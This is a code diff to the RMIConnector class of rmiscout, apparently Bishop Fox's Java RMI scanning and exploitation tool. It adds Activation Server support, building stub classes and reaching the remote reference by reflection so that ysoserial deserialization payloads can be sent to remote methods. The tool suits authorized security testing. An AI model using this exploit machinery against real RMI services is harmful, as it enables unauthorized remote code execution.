@@ -1,11 +1,11 @@
 package com.bishopfox.rmiscout;
 
 import javassist.*;
+import javassist.Modifier;
 import javassist.bytecode.DuplicateMemberException;
 import sun.misc.Unsafe;
 import ysoserial.payloads.ObjectPayload;
 
-import java.io.*;
 import java.lang.reflect.*;
 import java.rmi.*;
 import java.rmi.registry.LocateRegistry;
@@ -23,6 +23,7 @@ public class RMIConnector {
     private boolean allowUnsafe;
     private Class dummyClass;
     private static final int parameterTypesOffset = 52;
+    private boolean isActivationServer;
 
 
     private static class Colors {
@@ -49,9 +50,11 @@ public class RMIConnector {
     }
 
     @SuppressWarnings("unchecked")
-    public RMIConnector(String host, int port, String remoteName, List<String> signatures, boolean allowUnsafe) {
+    public RMIConnector(String host, int port, String remoteName, List<String> signatures, boolean allowUnsafe, boolean isActivationServer) {
         try {
             this.allowUnsafe = allowUnsafe;
+            this.isActivationServer = isActivationServer;
+
             this.registry = LocateRegistry.getRegistry(host, port);
             this.remoteRefs = new HashMap<>();
 
@@ -90,8 +93,33 @@ public class RMIConnector {
                     }
                 }
 
+                String stubName = "";
+                if (isActivationServer) {
+                    stubName = interfaceName;
+                    interfaceName = "ActivationStub";
+                }
+
                 CtClass nInterface = defaultClassPool.makeInterface(interfaceName, remoteInterface);
                 generateStubs(nInterface, signatures);
+
+                if (isActivationServer) {
+                    // Example ActivationStub
+                    //
+                    // All stubs have same hardcoded serialVersionUID = 2; https://bugs.openjdk.java.net/browse/JDK-4066716
+                    //
+                    // public class MyClass_Stub extends RemoteStub implements Remote
+                    // {
+                    //    private static final long serialVersionUID = 2L;
+                    // }
+
+                    CtClass activationStub = defaultClassPool.makeClass(stubName, defaultClassPool.getCtClass(RemoteStub.class.getName()));
+                    activationStub.setInterfaces(new CtClass[]{nInterface});
+
+                    CtField f = new CtField(CtPrimitiveType.longType, "serialVersionUID", activationStub);
+                    f.setModifiers(Modifier.PRIVATE | Modifier.STATIC | Modifier.FINAL);
+                    activationStub.addField(f, CtField.Initializer.constant(2L));
+                    activationStub.toClass(customClassLoader);
+                }
 
                 originalClassLoader = Thread.currentThread().getContextClassLoader();
 
@@ -100,7 +128,11 @@ public class RMIConnector {
             }
 
         } catch (RemoteException e) {
-            System.err.println(e.getMessage());
+            if (e.getMessage().contains("class invalid for deserialization")) {
+                System.err.println("RMI Activation Server detected. Re-run with --activation-server");
+            } else {
+                System.err.println(e.getMessage());
+            }
             System.exit(1);
         } catch (Exception e) {
             e.printStackTrace();
@@ -244,9 +276,19 @@ public class RMIConnector {
                     Arrays.fill(fakeParameterTypes, payload.getClass());
 
                     // Bypass internal call flow for custom params
-                    Field f = Proxy.class.getDeclaredField("h");
-                    f.setAccessible(true);
-                    RemoteObjectInvocationHandler ref = (RemoteObjectInvocationHandler) f.get(stub);
+                    RemoteRef ref = null;
+                    if (this.isActivationServer) {
+                        Field f = RemoteObject.class.getDeclaredField("ref");
+                        f.setAccessible(true);
+                        ref = (RemoteRef) f.get(stub);
+                    } else {
+                        Field f = Proxy.class.getDeclaredField("h");
+                        f.setAccessible(true);
+                        ref = ((RemoteObjectInvocationHandler) f.get(stub)).getRef();
+                    }
+
+
+
 
                     // Calculate MethodHash
                     Method m = RemoteObjectInvocationHandler.class.getDeclaredMethod("getMethodHash", Method.class);
@@ -268,7 +310,7 @@ public class RMIConnector {
                     }
 
                     // Invoke remote method
-                    Object response = ref.getRef().invoke(stub, me, params, methodHash);
+                    Object response = ref.invoke(stub, me, params, methodHash);
 
                     // This next line should only occur when allowUnsafe or when launching exploits
                     System.out.println("Executed Payload: " + methodSignature);
@@ -320,6 +362,10 @@ public class RMIConnector {
             try {
                 CtClass ctClass = defaultClassPool.getCtClass(registryName);
                 ctClass.detach();
+
+                if (this.isActivationServer) {
+                    defaultClassPool.getCtClass(pair.getValue().getClass().getName()).detach();
+                }
             } catch (NotFoundException e) {
                 e.printStackTrace();
             }
